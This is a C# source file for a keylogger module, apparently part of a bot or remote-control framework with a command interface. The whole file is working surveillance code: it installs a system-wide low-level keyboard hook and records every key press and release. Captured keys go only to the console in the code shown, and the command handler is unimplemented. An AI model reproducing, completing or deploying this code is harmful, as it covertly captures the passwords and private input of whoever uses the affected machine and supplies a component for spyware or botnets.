using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Spindle;

namespace CoreModule.Modules {
    /// <summary>
    ///     Module that logs keypresses 
    /// </summary>
    public class Logger : IBotModule {
        private enum HookType {
            WH_JOURNALRECORD = 0,
            WH_JOURNALPLAYBACK = 1,
            WH_KEYBOARD = 2,
            WH_GETMESSAGE = 3,
            WH_CALLWNDPROC = 4,
            WH_CBT = 5,
            WH_SYSMSGFILTER = 6,
            WH_MOUSE = 7,
            WH_HARDWARE = 8,
            WH_DEBUG = 9,
            WH_SHELL = 10,
            WH_FOREGROUNDIDLE = 11,
            WH_CALLWNDPROCRET = 12,
            WH_KEYBOARD_LL = 13,
            WH_MOUSE_LL = 14
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(HookType hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        public string Identifier => "LOGGER";

        private const int WM_KEYDOWN = 0x100;
        private const int WM_KEYUP = 0x101;

        private static IntPtr _hookID = IntPtr.Zero;

        public Logger() {
            _hookID = SetHook(HookCallback);
        }

        private IntPtr SetHook(HookProc proc) {
            Console.WriteLine("Hooking logger");
            using(Process p = Process.GetCurrentProcess()) {
                using(ProcessModule m = p.MainModule) {
                    IntPtr hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, proc, IntPtr.Zero, 0);
                    
                    return hook;
                }
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if(nCode >= 0) {
                if(wParam == (IntPtr)WM_KEYDOWN) {
                    int vkCode = Marshal.ReadInt32(lParam);
                    Console.WriteLine("down: " + (Keys)vkCode);
                } else if(wParam == (IntPtr)WM_KEYUP) {
                    int vkCode = Marshal.ReadInt32(lParam);
                    Console.WriteLine("up: " + (Keys)vkCode);
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public string CommandReceived(string command) {
            throw new NotImplementedException();
        }
    }
}